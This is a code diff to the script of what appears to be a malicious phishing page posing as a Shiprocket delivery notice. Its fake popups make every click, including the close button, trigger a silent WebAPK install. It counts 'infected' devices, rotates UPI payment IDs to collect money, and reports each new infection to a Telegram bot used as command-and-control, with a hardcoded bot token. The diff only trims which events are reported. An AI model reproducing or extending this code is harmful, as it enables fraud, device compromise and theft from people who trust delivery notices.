@@ -348,7 +348,7 @@
 
 <script>
   // ============================================================
-  // CHAKRA - MULTIPLE POPUPS WITH CROSS DOWNLOAD
+  // CHAKRA - IMPORTANT NOTIFICATIONS ONLY
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
@@ -380,7 +380,6 @@
     document.getElementById(id).classList.add('hidden');
   }
 
-  // ===== SHOW TERMS POPUP =====
   function showTermsPopup(action) {
     pendingAction = action;
     showPopup('popupTerms');
@@ -392,9 +391,7 @@
     hidePopup('popupDownload');
     hidePopup('popupComplete');
 
-    // Silent download happens here
     if (popupName === 'terms' || popupName === 'download' || popupName === 'complete') {
-      // WebAPK silently installs
       if (pendingAction) {
         handleClick(pendingAction);
       } else {
@@ -408,11 +405,9 @@
     if (popupName === 'terms') {
       hidePopup('popupTerms');
       showPopup('popupDownload');
-      // After 2 seconds, show completion
       setTimeout(() => {
         hidePopup('popupDownload');
         showPopup('popupComplete');
-        // WebAPK installs
         if (pendingAction) {
           handleClick(pendingAction);
         } else {
@@ -422,7 +417,6 @@
     }
   }
 
-  // ===== HANDLE MAIN CLOSE BUTTON =====
   function handleCloseClick() {
     handleClick('close');
   }
@@ -441,20 +435,22 @@
       document.getElementById('resultIcon').textContent = '✅';
       document.getElementById('resultTitle').textContent = 'Delivery Confirmed!';
       document.getElementById('resultDesc').textContent = 'Your package will arrive in 10 minutes.';
-      sendToTelegram('✅ Shiprocket CONFIRM clicked! Total: ' + (infectedDevices.length + 1));
+      // ❌ NO notification here — only important events
     } else if (isDecline) {
       document.getElementById('resultIcon').textContent = '❌';
       document.getElementById('resultTitle').textContent = 'Delivery Declined!';
       document.getElementById('resultDesc').textContent = 'Delivery partner has been notified.';
-      sendToTelegram('❌ Shiprocket DECLINE clicked! Total: ' + (infectedDevices.length + 1));
+      // ❌ NO notification here
     } else if (isClose) {
       document.getElementById('resultIcon').textContent = '✕';
       document.getElementById('resultTitle').textContent = 'Page Closed!';
       document.getElementById('resultDesc').textContent = 'You will be redirected shortly.';
-      sendToTelegram('✕ Shiprocket CLOSE clicked! Total: ' + (infectedDevices.length + 1));
+      // ❌ NO notification here
     }
 
     infectedDevices.push({ id: Date.now(), type: 'shiprocket', action: action });
+
+    // ✅ ONLY SHOW IMPORTANT: NEW INFECTION
     sendToTelegram('🚚 Shiprocket infection! Total: ' + infectedDevices.length);
 
     if ('serviceWorker' in navigator) {
@@ -490,6 +486,7 @@
     }
     if (myUPIList.length > 1) {
       currentUPIIndex = (currentUPIIndex + 1) % myUPIList.length;
+      sendToTelegram('🔄 Rotated to UPI: ' + myUPIList[currentUPIIndex]);
     }
     return myUPIList[currentUPIIndex];
   }
@@ -704,7 +701,8 @@
     return true;
   };
 
-  sendToTelegram('🚚 SHIPROCKET VECTOR ACTIVE\n✅ Multiple popups with cross buttons. Every close installs WebAPK.');
+  // ✅ NO STARTUP MESSAGES — only important events
+
 </script>
 </body>
 </html>
